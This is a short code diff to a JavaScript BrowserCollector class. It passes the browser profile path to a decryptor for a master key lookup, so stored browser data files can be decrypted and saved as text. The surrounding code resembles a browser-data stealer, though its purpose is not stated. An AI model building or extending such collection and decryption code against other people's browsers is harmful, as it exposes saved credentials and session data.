@@ -248,7 +248,7 @@ class BrowserCollector {
         for (const [dataType, fileName] of Object.entries(browserConfig.files)) {
             try {
                 const filePath = path.join(profile.path, fileName);
-                const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName, browserKey);
+                const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profile.path);
                 
                 // Map data types to stats
                 switch (dataType) {
@@ -286,16 +286,17 @@ class BrowserCollector {
      * @param {string} dataType - Type of data
      * @param {string} fileName - File name
      * @param {string} browserKey - Browser identifier
+     * @param {string} profilePath - Profile path for master key lookup
      * @returns {Promise<number>} Number of records processed
      */
-    async collectDataFile(filePath, profileFolder, dataType, fileName, browserKey) {
+    async collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profilePath) {
         if (!fs.existsSync(filePath)) {
             return 0;
         }
 
         try {
             // Decrypt and parse the browser data
-            const decryptedData = await this.decryptor.decryptAndParse(filePath, dataType, browserKey);
+            const decryptedData = await this.decryptor.decryptAndParse(filePath, dataType, browserKey, profilePath);
             
             if (decryptedData && decryptedData.length > 0) {
                 // Format as text
